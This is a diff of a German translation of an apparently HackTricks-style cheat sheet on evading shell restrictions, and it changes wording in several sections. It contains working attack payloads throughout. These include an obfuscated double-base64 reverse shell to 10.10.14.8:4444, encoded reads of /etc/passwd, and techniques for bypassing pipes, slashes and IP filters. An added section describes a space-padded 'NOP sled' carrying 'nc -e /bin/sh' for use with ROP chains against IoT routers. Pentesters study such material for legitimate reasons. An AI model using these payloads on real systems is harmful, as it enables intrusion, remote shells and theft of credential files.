@@ -10,7 +10,7 @@
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Kurze Rev Shell
+### Kurze Rev-Shell
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -105,16 +105,16 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Umgehen von Backslash und Slash
+### Umgehung von Backslash und Slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Pipes umgehen
+### Bypass-Pipes
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Umgehung mit Hex-Codierung
+### Bypass mit Hex-Encoding
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -124,7 +124,7 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Umgehen von IPs
+### Bypass IPs
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
@@ -140,12 +140,12 @@ echo ${PATH:0:1} #/
 ```
 ### DNS-Datenexfiltration
 
-Sie könnten zum Beispiel **burpcollab** oder [**pingb**](http://pingb.in) verwenden.
+Sie könnten **burpcollab** oder [**pingb**](http://pingb.in) verwenden, zum Beispiel.
 
 ### Builtins
 
-Falls Sie keine externen Funktionen ausführen können und nur Zugriff auf eine **begrenzte Menge an Builtins haben, um RCE zu erhalten**, gibt es einige nützliche Tricks, um dies zu tun. Normalerweise **werden Sie nicht alle** der **Builtins** verwenden können, daher sollten Sie **alle Ihre Optionen kennen**, um zu versuchen, das Jail zu umgehen. Idee von [**devploit**](https://twitter.com/devploit).\
-Zuerst überprüfen Sie alle [**Shell-Builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Hier sind einige **Empfehlungen**:
+Falls Sie keine externen Funktionen ausführen können und nur Zugriff auf eine **begrenzte Menge an Builtins haben, um RCE zu erhalten**, gibt es einige nützliche Tricks, um dies zu tun. Normalerweise **werden Sie nicht in der Lage sein, alle** der **Builtins** zu verwenden, daher sollten Sie **alle Ihre Optionen kennen**, um zu versuchen, das Jail zu umgehen. Idee von [**devploit**](https://twitter.com/devploit).\
+Zuerst überprüfen Sie alle [**Shell Builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Hier sind einige **Empfehlungen**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -308,11 +308,33 @@ bypass-fs-protections-read-only-no-exec-distroless/
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## References & More
+## Space-Based Bash NOP Sled ("Bashsledding")
+
+Wenn eine Schwachstelle es Ihnen ermöglicht, ein Argument teilweise zu kontrollieren, das letztendlich `system()` oder eine andere Shell erreicht, wissen Sie möglicherweise nicht den genauen Offset, an dem die Ausführung beginnt, Ihre Nutzlast zu lesen. Traditionelle NOP-Sleds (z. B. `\x90`) funktionieren in der Shell-Syntax **nicht**, aber Bash ignoriert harmlos führende Leerzeichen, bevor ein Befehl ausgeführt wird.
+
+Daher können Sie einen *NOP sled für Bash* erstellen, indem Sie Ihren echten Befehl mit einer langen Folge von Leerzeichen oder Tabulatorzeichen voranstellen:
+```bash
+# Payload sprayed into an environment variable / NVRAM entry
+"                nc -e /bin/sh 10.0.0.1 4444"
+# 16× spaces ───┘ ↑ real command
+```
+Wenn eine ROP-Kette (oder eine andere Speicherbeschädigungsprimitive) den Befehlszeiger irgendwo innerhalb des Speicherblocks platziert, überspringt der Bash-Parser einfach die Leerzeichen, bis er `nc` erreicht, und führt Ihren Befehl zuverlässig aus.
+
+Praktische Anwendungsfälle:
+
+1. **Speichermapped-Konfigurationsblobs** (z. B. NVRAM), die prozessübergreifend zugänglich sind.
+2. Situationen, in denen der Angreifer keine NULL-Bytes schreiben kann, um die Nutzlast auszurichten.
+3. Eingebettete Geräte, bei denen nur BusyBox `ash`/`sh` verfügbar ist – sie ignorieren ebenfalls führende Leerzeichen.
+
+> 🛠️  Kombinieren Sie diesen Trick mit ROP-Gadgets, die `system()` aufrufen, um die Exploit-Zuverlässigkeit auf speicherbeschränkten IoT-Routern erheblich zu erhöhen.
+
+## Referenzen & Mehr
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
+
+- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
